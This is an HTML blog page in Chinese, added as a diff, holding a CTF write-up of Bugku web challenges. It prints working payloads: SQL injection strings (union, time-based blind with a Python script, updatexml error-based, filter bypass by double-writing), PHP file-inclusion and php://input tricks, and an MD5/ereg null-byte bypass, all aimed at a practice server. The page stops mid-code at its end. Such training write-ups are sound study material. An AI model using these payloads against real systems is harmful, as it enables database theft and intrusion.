@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yuhaojiang.gitee.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言最近把bugku的基础web题都刷完了。里面有大概10道题都不能访问。这里记录一下解题的过程。 备份是个好习惯题目提示：听说备份是个好习惯。 于是试着加入后缀index.php.bak，然后看到提示下载。然后打开下载的备份文件看到：   就是要传入的两个值的md5相等，但是两个值不相等。 解决方式一：md5函数无法处理数组，如果传入数组会返回NULL。构造url: 1http:&#x2F;&#x2F;123.20">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BugkuCTF-WEB">
+<meta property="og:url" content="https://yuhaojiang.gitee.io/2020/03/26/BugkuCTF-WEB/index.html">
+<meta property="og:site_name" content="kawhi的博客">
+<meta property="og:description" content="前言最近把bugku的基础web题都刷完了。里面有大概10道题都不能访问。这里记录一下解题的过程。 备份是个好习惯题目提示：听说备份是个好习惯。 于是试着加入后缀index.php.bak，然后看到提示下载。然后打开下载的备份文件看到：   就是要传入的两个值的md5相等，但是两个值不相等。 解决方式一：md5函数无法处理数组，如果传入数组会返回NULL。构造url: 1http:&#x2F;&#x2F;123.20">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200322105903654.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200322104141287.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200320140041305.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200322144603485.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200322165647628.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200322201254499.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200322212200486.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200322212837581.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200322213958769.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200323114059871.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200323115824785.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200323120059198.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200323212638319.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200324095112996.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200324155132388.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200325174427232.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200325183547450.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200325183817128.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200325203204296.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200325203355071.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200326201031090.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200331150635411.png">
+<meta property="og:image" content="http://img.kawhi.xyz/image-20200331150809369.png">
+<meta property="article:published_time" content="2020-03-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-16T04:00:40.911Z">
+<meta property="article:author" content="kawhi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.kawhi.xyz/image-20200322105903654.png">
+
+<link rel="canonical" href="https://yuhaojiang.gitee.io/2020/03/26/BugkuCTF-WEB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BugkuCTF-WEB | kawhi的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">kawhi的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://yuhaojiang.gitee.io/2020/03/26/BugkuCTF-WEB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BugkuCTF-WEB
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-26 00:00:00" itemprop="dateCreated datePublished" datetime="2020-03-26T00:00:00+08:00">2020-03-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-16 12:00:40" itemprop="dateModified" datetime="2020-10-16T12:00:40+08:00">2020-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>最近把bugku的基础web题都刷完了。里面有大概10道题都不能访问。这里记录一下解题的过程。</p>
+<h5 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a><strong>备份是个好习惯</strong></h5><p>题目提示：听说备份是个好习惯。</p>
+<p>于是试着加入后缀<strong>index.php.bak</strong>，然后看到提示下载。然后打开下载的备份文件看到：</p>
+<img src="http://img.kawhi.xyz/image-20200322105903654.png" alt="image-20200322105903654" style="high:80%;width:80%;" />
+
+<p>就是要传入的两个值的md5相等，但是两个值不相等。</p>
+<p><strong>解决方式一：</strong>md5函数无法处理数组，如果传入数组会返回NULL。构造url:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kkeyey1[]=1&amp;kkeyey2[]=2</span><br></pre></td></tr></table></figure>
+
+<p><strong>解决方式二：</strong>如果字符经过md5加密后的值为0exx的形式，会被认为是科学计数法，且表示0*10的xxxx次方，还是零。构造url:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kkeyey1=QNKCDZO&amp;kkeyey2=240610708</span><br></pre></td></tr></table></figure>
+
+<h5 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a><strong>变量1</strong></h5><p>打开网页看到</p>
+<img src="http://img.kawhi.xyz/image-20200322104141287.png" alt="image-20200322104141287" style="high:80%;width:80%;" />
+
+<p>题目已经通过正则表达式对$args进行了过滤，但是这里可以使用超全局变量$GLOBALS。</p>
+<p>因为PHP在$GLOBALS[index]数组中储存了所有全局变量，变量的名字就是数组的键。</p>
+<p>构造url:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure>
+
+<h5 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a><strong>flag在index里</strong></h5><p>打开页面如下：</p>
+<img src="http://img.kawhi.xyz/image-20200320140041305.png" alt="image-20200320140041305" style="high:80%;width:80%;" />
+
+<p>看到file知道应该是文件包含漏洞，但不知道如何下手，看wp之后知道可以用PHP内置协议php://filter</p>
+<p>构造url:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>可以看到通过base64加密后的源码已经爆出,解密,得到flag。</p>
+<h5 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a><strong>成绩单</strong></h5><p>打开网页如下：</p>
+<img src="http://img.kawhi.xyz/image-20200322144603485.png" alt="image-20200322144603485" style="high:80%;width:80%;" />
+
+<p>一开始我就觉得是sql注入，但是还是没有做出来，然后看了wp觉得好简单。</p>
+<p>查数据库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,database()--</span></span><br></pre></td></tr></table></figure>
+
+<p>查表名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,table_name from information_schema.tables where table_schema=&#x27;</span>skctf_flag<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure>
+
+<p>查字段名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,column_name from information_schema.columns where table_name=&#x27;</span>fl4g<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure>
+
+<p>查内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,skctf_flag from fl4g--</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h5 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a><strong>秋名山老司机</strong></h5><p>打开网页看到如下：</p>
+<img src="http://img.kawhi.xyz/image-20200322165647628.png" alt="image-20200322165647628" style="high:80%;width:80%;" />
+
+<p>本题要求计算响应内容中的表达式并用 POST 请求返回结果，但是必须在两秒之内完成。所以靠手工的方法是做不到的。这里可以利用python里面的request写一个脚本。详情可参考：<a style="text-decoration:none;" class="foo" target="_blank" href="https://ciphersaw.me/2017/12/16/详解 CTF Web 中的快速反弹 POST 请求/">传送门</a></p>
+<p>脚本如下：</p>
+<img src="http://img.kawhi.xyz/image-20200322201254499.png" alt="image-20200322201254499" style="high:80%;width:80%;" />
+
+<p>这里的会话对象 Session() 能够在多次请求中保持参数，然后是引入 re 模块，其次用 search() 正则匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串。获得算术表达式的字符串后，直接利用 Python 的內建方法 <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/functions.html#eval">eval()</a> 来计算出结果。然后运行脚本就可得到flag。</p>
+<h5 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a><strong>速度要快</strong></h5><p>打开网页如下：</p>
+<img src="http://img.kawhi.xyz/image-20200322212200486.png" alt="image-20200322212200486" style="high:80%;width:80%;" />
+
+<p>然后查看响应头和网页的源代码发现：</p>
+<img src="http://img.kawhi.xyz/image-20200322212837581.png" alt="image-20200322212837581" style="high:80%;width:80%;" />
+
+<p>应该是要提交以margin为key，flag里的值为value然后以post的方式提交数据。但是有一个问题就是手动提交没成功，查看wp发现和秋名山老司机那一题是差不多的。他的flag是不断在变的。所以需要写一个脚本来得到flag。</p>
+<img src="http://img.kawhi.xyz/image-20200322213958769.png" alt="image-20200322213958769" style="high:80%;width:80%;" />
+
+<h5 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a><strong>cookie欺骗</strong></h5><p>打开网页发现：</p>
+<img src="http://img.kawhi.xyz/image-20200323114059871.png" alt="image-20200323114059871" style="high:80%;width:80%;" />
+
+<p>这里把filename后面的字符串base64解码后发现是keys.txt。然后试着把index.php传上去，这里需要base64编码后再上传。然后line的值输入数字之后发现出现一行一行的代码，这里可以写个脚本把所有的代码显示出来。</p>
+<img src="http://img.kawhi.xyz/image-20200323115824785.png" alt="image-20200323115824785" style="high:80%;width:80%;" />
+
+<p>分析源码，前面判断传参，后面判断cookie必须满足margin=margin才能访问keys.php。</p>
+<img src="http://img.kawhi.xyz/image-20200323120059198.png" alt="image-20200323120059198" style="high:80%;width:80%;" />
+
+<h5 id="Never-give-up"><a href="#Never-give-up" class="headerlink" title="Never give up"></a><strong>Never give up</strong></h5><p>打开网页如下所示：</p>
+<img src="http://img.kawhi.xyz/image-20200323212638319.png" alt="image-20200323212638319" style="high:80%;width:80%;" />
+
+<p>发现源代码里面有一个1p.html，但是直接访问这个的话是会跳转到官网里面。所以使用burp suite抓包，然后经过一系列的编码后发现一段php的代码。</p>
+<img src="http://img.kawhi.xyz/image-20200324095112996.png" alt="image-20200324095112996" style="high:80%;width:80%;" />
+
+<p>这里其实直接打开<a target="_blank" rel="noopener" href="http://123.206.87.240:8006/test/f4l2a3g.txt%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97flag%E4%BA%86%E3%80%82%E4%BD%86%E6%98%AF%E7%9C%8Bwp%E4%B9%8B%E5%90%8E%E6%9C%89%E4%BA%BA%E8%AF%B4%E5%8F%AF%E8%83%BD%E6%98%AF%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E5%A4%B1%E8%AF%AF%E3%80%82%E6%89%80%E4%BB%A5%E8%BF%98%E6%9C%89%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95%E3%80%82">http://123.206.87.240:8006/test/f4l2a3g.txt即可获得flag了。但是看wp之后有人说可能是出题人的失误。所以还有另外一种解法。</a></p>
+<p>第1行：限制 URL 查询字符串中必须有非空非零变量<font color=#DC143C>id</font></p>
+<p>这里弱类型比较的时候，字符串是等于0的。</p>
+<p>弱类型比较详情：<a style="text-decoration:none;" class="foo" target="_blank" href="https://www.php.net/manual/zh/types.comparisons.php">传送门</a></p>
+<p>第9行：限制变量<font color=#DC143C>$a</font>中不能含有字符<code>.</code></p>
+<p>第15行：要满足以下 5 条表达式才会爆 flag：</p>
+<ul>
+<li>变量<font color=#DC143C>$data</font>弱等于字符串<font color=#DC143C>bugku is a nice plateform!</font>。</li>
+</ul>
+<p>这里的变量<code>$data</code>是由<code>file_get_contents()</code>函数读取的，所以直接给a赋值是不行的，这里要用伪协议  <code>php://</code>  来访问输入输出的数据流。其中<code>php://input</code> 可以访问原始请求数据中的只读流。这里令 <code>$a = &quot;php://input&quot;</code>，并在请求主体中提交字符串 <code>bugku is a nice plateform!</code>。</p>
+<p>有关 PHP 伪协议的详情：<a style="text-decoration:none;" class="foo" target="_blank" href="https://www.php.net/manual/zh/wrappers.php">传送门</a></p>
+<ul>
+<li>变量<font color=#DC143C>$id</font>弱等于整型数0</li>
+<li>变量<font color=#DC143C>$b</font>的长度大于5</li>
+<li>字符串<font color=#DC143C>1114</font> 要与字符串 <font color=#DC143C>111</font> 连接变量 <font color=#DC143C>$b</font> 的第一个字符构成的正则表达式匹配。</li>
+</ul>
+<p><code>ereg()</code> 函数或 <code>eregi()</code> 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。</p>
+<p>源码中待匹配字符串（第二个参数）已确定为 <code>&quot;1114&quot;</code>，正则表达式（第一个参数）由 <code>&quot;111&quot;</code> 连接 <code>$b</code> 的第一个字符组成，若令 <code>substr($b,0,1) = &quot;\x00&quot;</code>，即满足 <code>&quot;1114&quot;</code> 与 <code>&quot;111&quot;</code> 匹配。因此，这里假设 <code>$b = &quot;\x0012345&quot;</code>，才能满足以上三个条件。</p>
+<ul>
+<li>变量 <font color=#DC143C>$b</font> 的第一个字符弱不等于整型数 <font color=#DC143C>4</font></li>
+</ul>
+<p>构造payload后爆出flag</p>
+<p>这里要注意的是在构造变量 <code>b</code> 中的空字符时，过早将空字符 <code>\x00</code> 放入，在提交请求时导致请求头截断，继而请求失败，得不到响应。因为 <code>b</code> 是 URL 查询字符串中的变量，不应该在此放入空字符 <code>\x00</code>，而应该为空字符的 URL 编码 <code>%00</code>。</p>
+<img src="http://img.kawhi.xyz/image-20200324155132388.png" alt="image-20200324155132388" style="high:80%;width:80%;" />
+
+<h5 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a><strong>字符？正则？</strong></h5><img src="http://img.kawhi.xyz/image-20200325174427232.png" alt="image-20200325174427232" style="high:80%;width:80%;" />
+
+<p>题目如上：可以看出只要我们构造出符合正则表达式的字符串通过GET传参就可以看到flag。所以首先要分析这个正则。</p>
+<p><strong>定界符：</strong>/和/ 一般来说是这两个。</p>
+<p><strong>. （一个点）：</strong>表示可以匹配任何字符。</p>
+<p><strong>{n,m} ：</strong>前面的字符重复4~7次。</p>
+<p><strong>\ （反斜线）：</strong>后面的字符被转义。</p>
+<p><strong>[a-z] ：</strong>在a到z中匹配。</p>
+<p><strong>[[:punct:]] ：</strong>匹配任何标点符号。</p>
+<p><strong>/i ：</strong>表示这个正则表达式对大小写不敏感。</p>
+<p>这里我构造的payload为：key1key11111key:/1/1keya&gt;</p>
+<p>通过get传参即可得到flag。</p>
+<h5 id="web8"><a href="#web8" class="headerlink" title="web8"></a><strong>web8</strong></h5><p>题目如下：</p>
+<img src="http://img.kawhi.xyz/image-20200325183547450.png" alt="image-20200325183547450" style="high:80%;width:80%;" />
+
+<p>首先分析一下这个题目：</p>
+<p>ac变量不为空，fn要用php://input读取，和前面的题目有一些类似</p>
+<img src="http://img.kawhi.xyz/image-20200325183817128.png" alt="image-20200325183817128" style="high:80%;width:80%;" />
+
+<p>这道题是自己做出来的flag，虽然题目简单，还是挺开心的，终于不用看wp了。</p>
+<h5 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a><strong>求getshell</strong></h5><p>题目如下</p>
+<img src="http://img.kawhi.xyz/image-20200325203204296.png" alt="image-20200325203204296" style="high:80%;width:80%;" />
+
+<p>用burpsuite抓包后改这三个地方即可得到flag</p>
+<img src="http://img.kawhi.xyz/image-20200325203355071.png" alt="image-20200325203355071" style="high:80%;width:80%;" />
+
+<p>没想到是这样就得出flag，一开始我只改了下面两个箭头，还拿菜刀在那里连个半天。</p>
+<h5 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a><strong>INSERT INTO注入</strong></h5><img src="http://img.kawhi.xyz/image-20200326201031090.png" alt="image-20200326201031090" style="high:80%;width:80%;" />
+
+<p>题目直接给出了源代码，并且告知要写python脚本。</p>
+<p>这里用explode函数将字符串转换成数组，并且是根据逗号分割的。所以这里</p>
+<p>if(expr1,expr2,expr3)这个函数就用不了了，这里可以用这个代替。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when xxx then xxx <span class="keyword">else</span> xxx end</span><br></pre></td></tr></table></figure>
+
+<p>同时substr(database(),1,1)等同于substr(database() from 1 for 1)</p>
+<p><strong>查数据库名：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">mystring = string.ascii_letters+string.digits</span><br><span class="line">url=<span class="string">&#x27;http://123.206.87.240:8002/web15/&#x27;</span></span><br><span class="line">data = <span class="string">&quot;1&#x27; and (select case when (substr(database() from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> mystring:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">&#x27;x-forwarded-for&#x27;</span>:data.format(str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;The final flag:&#x27;</span>+flag</span><br></pre></td></tr></table></figure>
+
+<p>跑出的结果是web15。timeout的值可以大一些比如4，5。结果会更加准确。</p>
+<p><strong>查表名：</strong></p>
+<p>把上述代码database()换成如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database())</span><br></pre></td></tr></table></figure>
+
+<p>跑出的结果是clientipflag。</p>
+<p><strong>查字段名：</strong></p>
+<p>把上述代码database()换成如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跑出来的结果是flag。</p>
+<p><strong>查内容：</strong></p>
+<p>把上述代码database()换成如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select flag <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure>
+
+<p>跑出来的结果是cdbf14c9551d5be5612f7bb5d2867853。</p>
+<h5 id="多次"><a href="#多次" class="headerlink" title="多次"></a><strong>多次</strong></h5><p>题目的url为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9004/1ndex.php?id=1</span><br></pre></td></tr></table></figure>
+
+<p>id=5的时候，页面提示You can do some SQL injection in here.</p>
+<p>说明是一道注入题。这时候id输入<font color="red">1’</font>页面报错，继续输入<font color="red">1’–+</font>没有报错，再输入<font color="red">1’ and 1=1–+</font>却报错了，说明and应该是被过滤了。</p>
+<p>这里可以使用<strong>异或注入</strong>来判断过滤了什么字符。</p>
+<p>在id=1后面输入<font color="red">‘^(0)^’</font></p>
+<p>如果括号里面为0的话，整体为1，页面显示正确。括号里面为1，整体为0，页面显示错误。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;^(length(&#x27;and&#x27;)!=0)^&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果输入上面的字符，而页面显示正确的话，就说明and被过滤了。</p>
+<p>经过测试，发现union,select,or,and都被过滤了。from没有被过滤。</p>
+<p>这时候就可以构造url查数据库，查表，查字段，查内容了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,database()--+</span><br><span class="line"><span class="comment">#web1002-1</span></span><br><span class="line"></span><br><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;web1002-1&#x27;--+</span><br><span class="line"><span class="comment">#flag1,hint</span></span><br><span class="line"></span><br><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;flag1&#x27;--+</span><br><span class="line"><span class="comment">#flag1,address</span></span><br><span class="line"></span><br><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,select flag1 from flag1--+</span><br><span class="line"><span class="comment">#usOwycTju+FTUUzXosjr</span></span><br></pre></td></tr></table></figure>
+
+<p>然后查address的时候发下还有下一关。</p>
+<p>然后发现union,sleep,substr被过滤，select,or,and,from没有被过滤。</p>
+<p>但是双写无法绕过，大小写无法绕过。</p>
+<p>这里可以使用updatexml报错注入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line"><span class="comment">#web1002-2</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;web1002-2&#x27;  limit 1),0x7e),1)--+</span><br><span class="line"><span class="comment">#class,flag2</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag2&#x27; ),0x7e),1)--+</span><br><span class="line"><span class="comment">#flag2,address</span></span><br><span 